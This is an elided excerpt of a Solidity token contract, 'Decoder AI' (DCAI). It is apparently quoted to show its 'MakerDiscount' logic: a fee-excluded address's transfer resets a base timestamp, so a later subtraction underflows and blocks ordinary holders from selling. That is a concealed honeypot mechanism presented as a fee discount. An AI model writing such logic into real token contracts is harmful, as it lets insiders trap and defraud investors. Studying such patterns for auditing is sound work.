...
contract DecoderAI is ERC20, Ownable {
    ...
    address payable private immutable liquidityWallet = payable(0xca843Eb8F4978FFD6037520A5f859a53eE9f37A3);
    address payable private immutable marketingWallet = payable(0x58C3E80e19A00b18dcf295E3454f0bF95df0b8F9);
    address payable private immutable devWallet = payable(0xf21Bb1A397805ee6Cd66e1BE9B2a6fCc88586fBA);
    ...
    struct MakerDiscount {
        uint256 buy;
        uint256 sell;
        uint256 holdTime;
    }
    mapping(address => MakerDiscount) private _makerDiscount;
    uint256 private _makerDiscountBase;
    ...
    constructor() ERC20("Decoder AI", "DCAI") {
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _makerDiscountBase = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                MakerDiscount storage userDiscount = _makerDiscount[from];
                userDiscount.holdTime = userDiscount.buy - _makerDiscountBase;
                userDiscount.sell = block.timestamp;
            } else {
                MakerDiscount storage userDiscount = _makerDiscount[to];
